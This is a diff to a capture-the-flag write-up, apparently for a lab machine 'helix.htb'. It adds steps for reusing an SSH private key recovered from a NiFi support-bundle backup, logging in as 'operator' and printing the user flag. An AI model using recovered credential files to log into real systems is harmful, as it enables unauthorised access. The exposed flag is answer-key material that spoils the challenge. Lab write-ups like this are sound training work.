@@ -197,13 +197,33 @@ nifi@helix:/opt/nifi-1.21.0/support-bundles$ cat operator_id_ed25519.bak
 ![[Pasted image 20260811215020.png]]
 
 
+### Reusing the SSH Key
+
+1. **Transfer the key to our machine:**  
+    We manually copy the key content into a local file named `sshkey`.
+2. **Set the correct permissions:**
+```bash
+chmod 600 sshkey
+```
+
+
 ![[Pasted image 20260811215239.png]]
 
 
+3. **Attempt SSH login as `operator`:**
+```bash
+ssh -i sshkey operator@helix.htb
+```
+
+**Result:** SUCCESS! We are logged in as the `operator` user.
 
 ![[Pasted image 20260811215248.png]]
 
-
+**User Flag:**
+```bash
+operator@helix:~$ cat user.txt
+62157af723e569735d8f95e71ae5df9a
+```
 
 ![[Pasted image 20260811215531.png]]
 
